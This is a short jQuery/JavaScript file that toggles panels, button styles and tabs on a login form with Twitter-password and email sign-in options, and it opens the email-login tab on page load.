function et() {
    $('.et').show();
    $('.nt').hide();
}
$(document).ready(function() {
    $('#password-twitter').keyup(function() {
        if ($(this).val().length != 0) {
            $('.onbutton').removeClass().addClass('twbutton');
        } else {
            $('.twbutton').removeClass().addClass('onbutton');
        }
    })
});

function nt() {
    $('.nt').show();
    $('.et').hide();
}

function open_link() {
    $('.login-mail').show()
    //$('.account_login').show()
}

function openloginlink(evt, loginlink) {
    var i, form_login, form_login_link;
    form_login = document.getElementsByClassName("form_login");
    for (i = 0; i < form_login.length; i++) {
        form_login[i].style.display = "none";
    }
    form_login_link = document.getElementsByClassName("seclink-content");
    for (i = 0; i < form_login_link.length; i++) {
        form_login_link[i].className = form_login_link[i].className.replace(" seclink-content-active", "");
    }
    document.getElementById(loginlink).style.display = "block";
    evt.currentTarget.className += " seclink-content-active";
}
document.getElementById("email-login").click();